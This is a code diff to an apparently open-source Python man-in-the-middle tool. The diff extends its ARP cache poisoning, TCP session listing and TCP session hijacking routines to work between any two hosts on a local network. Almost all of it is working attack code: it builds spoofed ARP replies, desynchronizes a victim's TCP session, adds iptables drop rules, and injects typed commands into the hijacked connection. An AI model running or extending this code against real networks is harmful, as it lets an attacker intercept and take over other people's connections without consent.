@@ -175,7 +175,7 @@ class Mitm(object):
             self.restore(2)
             utils.set_ip_forward(0)
 
-    def list_sessions(self, stop, port=None):
+    def list_sessions(self, stop, target_b=None, port=None):
         """
         Try to get all TCP sessions of the target
         """
@@ -200,11 +200,13 @@ class Mitm(object):
         }
 
         source = utils.get_default_gateway_linux()
+        if target_b and target_b != self.gateway:
+            source = utils.get_mac_by_ip(target_b)
         pcap_filter = self._build_pcap_filter("ip host ", port)
         packets = pcap.pcap(self.dev)
         packets.setfilter(pcap_filter) # we need only self.target packets
         # need to create a daemon that continually poison our target
-        poison_thread = Thread(target=self.poison, args=(2,))
+        poison_thread = Thread(target=self.poison, args=(2, target_b, ))
         poison_thread.daemon = True
         poison_thread.start()
         print('[+] Start poisoning on ' + G + self.dev + W + ' between ' + G + source + W
@@ -317,9 +319,17 @@ class Mitm(object):
             self.restore(2)
             utils.set_ip_forward(0)
 
-    def hijack_session(self, port=None):
+    def hijack_session(self, target_b=None):
+        """
+        !! Still bugged, doesn't work properly !!
+        Try to hijack a TCP sessions between two local address
+        """
+        if not target_b:
+            target_b = self.gateway
+        print('[+] Sessions between {}{}{} and {}{}{} will be listed soon,\n'
+              '    just type the number of session to hijack and ENTER\n'.format(G, self.target, W, G, target_b, W))
         stop_thread = False
-        list_conn_thread = Thread(target=self.list_sessions, args=(lambda: stop_thread, port,))
+        list_conn_thread = Thread(target=self.list_sessions, args=(lambda: stop_thread, target_b, ))
         list_conn_thread.start()
         choice = None
         sock = socket(PF_PACKET, SOCK_RAW)
@@ -329,12 +339,13 @@ class Mitm(object):
             choice = int(choice) - 1
             if choice <= len(self.sessions) and choice > -1:
                 break
+        # must stop thread
         stop_thread = True
         list_conn_thread.join()
-        # must stop thread
         src_ip, src_port, dst_ip, dst_port = re.search(r'^([0-9.]+):(\d+)\s+<->\s+([0-9.]+):(\d+)$', self.sessions[choice]).groups()
         str_src_ip, str_src_port, str_dst_ip, str_dst_port = src_ip, src_port, dst_ip, dst_port
-        print("\n[*] Hijacking: {}:{} --> {}:{}".format(src_ip, src_port, dst_ip, dst_port))
+        print('\n[*] Trying an hijack for: {}:{} --> {}:{}'.format(src_ip, src_port, dst_ip, dst_port))
+        print('\n[*] Waiting for another packet in order to get a seq and a ack number')
         pcap_filter = 'src host %s and src port %s and dst host %s and dst port %s and tcp' % (src_ip, src_port, dst_ip, dst_port)
         packets = pcap.pcap(self.dev)
         packets.setfilter(pcap_filter)
@@ -348,9 +359,9 @@ class Mitm(object):
             else:
                 src_port, dst_port = tcp.sport, tcp.dport
             seq, ack, data = tcp.seq, tcp.ack, tcp.data
-            print('[*] SEQ: {}, ACK: {}'.format(seq, ack))
+            print('[*] Packet captured => SEQ: {}, ACK: {}'.format(seq, ack))
             seq += len(data)
-            print('[*] Sending 1024 bytes nop payload.\n')
+            print('[*] Sending 1024 bytes nop payload to trying a desynchronization.\n')
             tcp_layer = dpkt.tcp.TCP(
                 sport=src_port,
                 dport=dst_port,
@@ -374,7 +385,8 @@ class Mitm(object):
             print('[*] Desynchronization complete.')
             break
 
-        def tcpdaemon(ack):
+        def response_to(ack):
+            """Daemon function used to intercept responses from the hijacked session"""
             pcap_filter = 'src host %s and src port %s and dst host %s and dst port %s and tcp' % (str_dst_ip, str_dst_port, str_src_ip, str_src_port)
             sock = socket(PF_PACKET, SOCK_RAW)
             sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
@@ -409,43 +421,51 @@ class Mitm(object):
                         sock.send(str(eth_layer))
                         sys.stdout.write(tcp.data)
 
-        tcpdaemon_thread = Thread(target=tcpdaemon, args=(ack,))
+        # start a thread to handle responses to the hijacked session
+        tcpdaemon_thread = Thread(target=response_to, args=(ack,))
+        tcpdaemon_thread.daemon = True
         tcpdaemon_thread.start()
-        os.system("/sbin/iptables -A FORWARD -s %s -p tcp --sport %s -j DROP" % (str_src_ip, str_src_port));
-        os.system("/sbin/iptables -A FORWARD -d %s -p tcp --dport %s -j DROP" % (str_src_ip, str_src_port));
-        print('[*] Session hijacked, everything you enter is sent through it.')
+        os.system('/sbin/iptables -A FORWARD -s %s -p tcp --sport %s -j DROP' % (str_src_ip, str_src_port));
+        os.system('/sbin/iptables -A FORWARD -d %s -p tcp --dport %s -j DROP' % (str_src_ip, str_src_port));
+        print('[*] Session hijacked, everything entered now should be sent through it.')
 
-        while True:
-            data = raw_input("> ")
-            tcp_layer = dpkt.tcp.TCP(
-                sport=src_port,
-                dport=dst_port,
-                seq=seq,
-                ack=1,
-                data=data)
-            # build ip layer
-            ip_layer = dpkt.ip.IP(
-                src=src_ip,
-                dst=dst_ip,
-                data=tcp_layer)
-            # build ethernet layer
-            eth_layer = dpkt.ethernet.Ethernet(
-                dst=eth.dst,
-                src=eth.src,
-                type=eth.type,
-                data=ip_layer)
+        # start a command loop to send instruction to the hijacked session
+        try:
+            while True:
+                data = raw_input('> ')
+                tcp_layer = dpkt.tcp.TCP(
+                    sport=src_port,
+                    dport=dst_port,
+                    seq=seq,
+                    ack=1,
+                    data=data)
+                # build ip layer
+                ip_layer = dpkt.ip.IP(
+                    src=src_ip,
+                    dst=dst_ip,
+                    data=tcp_layer)
+                # build ethernet layer
+                eth_layer = dpkt.ethernet.Ethernet(
+                    dst=eth.dst,
+                    src=eth.src,
+                    type=eth.type,
+                    data=ip_layer)
 
-            sock.send(str(eth_layer))
-            seq += len(data)
+                sock.send(str(eth_layer))
+                seq += len(data)
+        except KeyboardInterrupt:
+            print('[+] Session hijacking interrupted\n\r')
+            self.restore(2)
+            utils.set_ip_forward(0)
 
-    def poison(self, delay):
+    def poison(self, delay, target_b=None):
         """
         Poison arp cache of target and router, causing all traffic between them to
         pass inside our machine, MITM heart
         """
         raise NotImplementedError("not implemented")
 
-    def restore(self, delay):
+    def restore(self, delay, target_b=None):
         """ reset arp cache of the target and the router (AP) """
         raise NotImplementedError("not implemented")
 
@@ -456,11 +476,13 @@ class PcapMitm(Mitm):
     def __init__(self, device, source_mac, gateway, target):
         super(PcapMitm, self).__init__(device, source_mac, gateway, target)
 
-    def poison(self, delay):
+    def poison(self, delay, target_b=None):
         """
         poison arp cache of target and router, causing all traffic between them to
         pass inside our machine, MITM heart
         """
+        if not target_b:
+            target_b = self.gateway
         utils.set_ip_forward(1)
         sock = socket(PF_PACKET, SOCK_RAW)
         sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
@@ -468,39 +490,41 @@ class PcapMitm(Mitm):
             while True:
                 if config.VERBOSE is True:
                     log.info('[+] %s <-- %s -- %s -- %s --> %s',
-                             self.gateway, self.target, self.dev, self.gateway, self.target)
+                             target_b, self.target, self.dev, target_b, self.target)
                     if not isinstance(self.target, list):
                         sock.send(str(utils.build_arp_packet(
-                            self.src_mac, self.gateway, self.target)))
+                            self.src_mac, target_b, self.target)))
                         sock.send(str(utils.build_arp_packet(
-                            self.src_mac, self.target, self.gateway)))
+                            self.src_mac, self.target, target_b)))
                         time.sleep(delay) # OS refresh ARP cache really often
                     else:
                         for addr in self.target:
-                            sock.send(str(utils.build_arp_packet(self.src_mac, self.gateway, addr)))
-                            sock.send(str(utils.build_arp_packet(self.src_mac, addr, self.gateway)))
+                            sock.send(str(utils.build_arp_packet(self.src_mac, target_b, addr)))
+                            sock.send(str(utils.build_arp_packet(self.src_mac, addr, target_b)))
                         time.sleep(delay) # OS refresh ARP cache really often
 
         except KeyboardInterrupt:
             print('\n\r[+] Poisoning interrupted')
             sock.close()
 
-    def restore(self, delay):
+    def restore(self, delay, target_b=None):
         """ reset arp cache of the target and the router (AP) """
-        source_mac = utils.get_mac_by_ip(self.gateway)
+        if not target_b:
+            target_b = self.gateway
+        source_mac = utils.get_mac_by_ip(target_b)
         sock = socket(PF_PACKET, SOCK_RAW)
         sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
         if not isinstance(self.target, list):
             target_mac = utils.get_mac_by_ip(self.target)
             for _ in xrange(6):
-                sock.send(str(utils.build_arp_packet(target_mac, self.gateway, self.target)))
-                sock.send(str(utils.build_arp_packet(source_mac, self.target, self.gateway)))
+                sock.send(str(utils.build_arp_packet(target_mac, target_b, self.target)))
+                sock.send(str(utils.build_arp_packet(source_mac, self.target, target_b)))
         else:
             for addr in self.target:
                 target_mac = utils.get_mac_by_ip(addr)
                 for _ in xrange(6):
-                    sock.send(str(utils.build_arp_packet(target_mac, self.gateway, addr)))
-                    sock.send(str(utils.build_arp_packet(source_mac, addr, self.gateway)))
+                    sock.send(str(utils.build_arp_packet(target_mac, target_b, addr)))
+                    sock.send(str(utils.build_arp_packet(source_mac, addr, target_b)))
 
 class ScapyMitm(Mitm):
     """
@@ -630,30 +654,34 @@ class ScapyMitm(Mitm):
         #     return getResponse
         sniff(filter=pcap_filter, prn=dns_poison)
 
-    def poison(self, delay):
+    def poison(self, delay, target_b=None):
+        if not target_b:
+            target_b = self.gateway
         if not isinstance(self.target, list):
             dst_mac = utils.get_mac_by_ip_s(self.target, delay)
-            send(ARP(op=2, pdst=self.target, psrc=self.gateway, hwdst=dst_mac), verbose=False)
-            send(ARP(op=2, pdst=self.gateway, psrc=self.target, hwdst=self.src_mac), verbose=False)
+            send(ARP(op=2, pdst=self.target, psrc=target_b, hwdst=dst_mac), verbose=False)
+            send(ARP(op=2, pdst=target_b, psrc=self.target, hwdst=self.src_mac), verbose=False)
         else:
             for addr in self.target:
                 dst_mac = utils.get_mac_by_ip_s(addr, delay)
-                send(ARP(op=2, pdst=addr, psrc=self.gateway, hwdst=dst_mac), verbose=False)
-                send(ARP(op=2, pdst=self.gateway, psrc=addr, hwdst=self.src_mac), verbose=False)
+                send(ARP(op=2, pdst=addr, psrc=target_b, hwdst=dst_mac), verbose=False)
+                send(ARP(op=2, pdst=target_b, psrc=addr, hwdst=self.src_mac), verbose=False)
 
-    def restore(self, delay):
+    def restore(self, delay, target_b=None):
+        if not target_b:
+            target_b = self.gateway
         if not isinstance(self.target, list):
             dst_mac = utils.get_mac_by_ip_s(self.target, delay)
-            send(ARP(op=2, pdst=self.gateway, psrc=self.target,
+            send(ARP(op=2, pdst=target_b, psrc=self.target,
                      hwdst="ff:" * 5 + "ff", hwsrc=dst_mac), count=3, verbose=False)
-            send(ARP(op=2, pdst=self.target, psrc=self.gateway,
+            send(ARP(op=2, pdst=self.target, psrc=target_b,
                      hwdst="ff:" * 5 + "ff", hwsrc=self.src_mac), count=3, verbose=False)
         else:
             for addr in self.target:
                 dst_mac = utils.get_mac_by_ip_s(addr, delay)
-                send(ARP(op=2, pdst=self.gateway, psrc=addr,
+                send(ARP(op=2, pdst=target_b, psrc=addr,
                          hwdst="ff:" * 5 + "ff", hwsrc=dst_mac), count=3, verbose=False)
-                send(ARP(op=2, pdst=addr, psrc=self.gateway,
+                send(ARP(op=2, pdst=addr, psrc=target_b,
                          hwdst="ff:" * 5 + "ff", hwsrc=self.src_mac), count=3, verbose=False)
 
 
